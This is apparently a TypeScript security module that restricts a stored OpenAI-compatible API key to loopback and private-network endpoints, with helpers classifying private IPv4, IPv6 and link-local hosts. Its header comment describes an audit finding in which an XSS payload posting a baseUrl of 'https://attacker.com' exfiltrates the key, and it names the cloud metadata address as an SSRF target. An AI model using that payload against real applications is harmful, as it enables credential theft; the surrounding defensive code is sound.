/**
 * SECURITY (audit M5 / H-2 residual): pinning a MAIN-INJECTED `openai-compat` key.
 *
 * The H-2 fix drops a renderer-supplied `baseUrl` when a stored key is injected — but ONLY
 * for the fixed-host providers (`CANONICAL_HOST_PROVIDERS`). `openai-compat` is excluded
 * because it legitimately needs a custom endpoint, so its stored key was sent to WHATEVER
 * `baseUrl` the renderer supplied: a renderer XSS posting `{provider:"openai-compat",
 * baseUrl:"https://attacker.com"}` (no `apiKey`) exfiltrated the stored key in the
 * `Authorization` header — exactly the key-exfil class H-2 closed for canonical providers.
 *
 * `openai-compat` is branded "Local (votre machine)" and defaults to Ollama on
 * `http://localhost:11434/v1`; the legitimate target is the user's own machine / LAN. So we
 * pin a main-injected openai-compat key to a **loopback / private-network** endpoint: an
 * attacker needs a PUBLIC host to receive the key, and every public host is refused here
 * (the key is simply not attached — fail closed). A genuinely remote OpenAI-compatible
 * endpoint is the rare case; it fails closed with a warning rather than leaking the key.
 * (Residual: to support a remote endpoint with a stored key, the configured endpoint must
 * be pinned WITH the key at set-time — a renderer/preload change tracked separately.)
 */

/** Is `host` an IPv4 dotted-quad in a loopback / private / link-local range? */
function isPrivateIpv4(host: string): boolean {
  const m = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/.exec(host);
  if (!m) return false;
  const o = m.slice(1).map(Number);
  if (o.some((n) => n > 255)) return false;
  const [a, b] = o;
  return (
    a === 127 || // loopback 127.0.0.0/8
    a === 10 || // private 10.0.0.0/8
    a === 0 || // 0.0.0.0/8 (this host)
    (a === 172 && b >= 16 && b <= 31) || // 172.16.0.0/12
    (a === 192 && b === 168) || // 192.168.0.0/16
    (a === 169 && b === 254) // link-local 169.254.0.0/16
  );
}

/** Is `host` a loopback / unique-local / link-local IPv6 literal (brackets stripped)? */
function isPrivateIpv6(host: string): boolean {
  const h = host.replace(/^\[|\]$/g, "").toLowerCase();
  if (h === "::1" || h === "::") return true;
  // IPv4-mapped/compat (::ffff:127.0.0.1) → classify by the embedded v4.
  const v4 = /(?:^|:)((?:\d{1,3}\.){3}\d{1,3})$/.exec(h);
  if (v4 && isPrivateIpv4(v4[1])) return true;
  // Unique-local fc00::/7 (fc.. / fd..) and link-local fe80::/10.
  return /^f[cd][0-9a-f]{0,2}:/.test(h) || /^fe[89ab][0-9a-f]?:/.test(h);
}

/** Link-local only (169.254/16, fe80::/10) — where cloud metadata services live. */
function isLinkLocalHost(host: string): boolean {
  const h = host.replace(/^\[|\]$/g, "").toLowerCase();
  return /^169\.254\.\d{1,3}\.\d{1,3}$/.test(h) || /^fe[89ab][0-9a-f]?:/.test(h);
}

/**
 * True when a URL is a LAN/loopback endpoint the app may CONTACT on the user's behalf
 * without a DNS/SSRF check: the `openai-compat` probe and its model listing
 * (`localEndpoint.ts`). Same set as {@link isLocalOrPrivateEndpoint} MINUS link-local —
 * a LAN box on 192.168.x is exactly the documented use, while 169.254.169.254 never is.
 * Hostnames that merely RESOLVE to a private address are not in this set (no DNS here);
 * they go through `assertPublicUrl` and are refused — use the IP or a `.local` name.
 */
export function isLanEndpoint(urlStr: string): boolean {
  let host: string;
  try {
    host = new URL(urlStr).hostname.toLowerCase();
  } catch {
    return false;
  }
  return isLocalOrPrivateEndpoint(urlStr) && !isLinkLocalHost(host);
}

/**
 * True when a URL points at the LOCAL machine / private network — the only place a
 * main-injected `openai-compat` key may be sent. A non-URL, or any public host, returns
 * false (fail closed → the caller drops the key).
 */
export function isLocalOrPrivateEndpoint(urlStr: string | undefined): boolean {
  if (!urlStr) return true; // no baseUrl → provider uses its localhost default
  let host: string;
  try {
    host = new URL(urlStr).hostname.toLowerCase();
  } catch {
    return false; // unparseable → treat as unsafe (don't attach the key)
  }
  if (!host) return false;
  if (host === "localhost" || host.endsWith(".localhost")) return true;
  if (host.endsWith(".local")) return true; // mDNS / LAN
  if (isPrivateIpv4(host)) return true;
  if (host.includes(":") || host.startsWith("[")) return isPrivateIpv6(host);
  return false; // any other resolvable public hostname / public IP
}
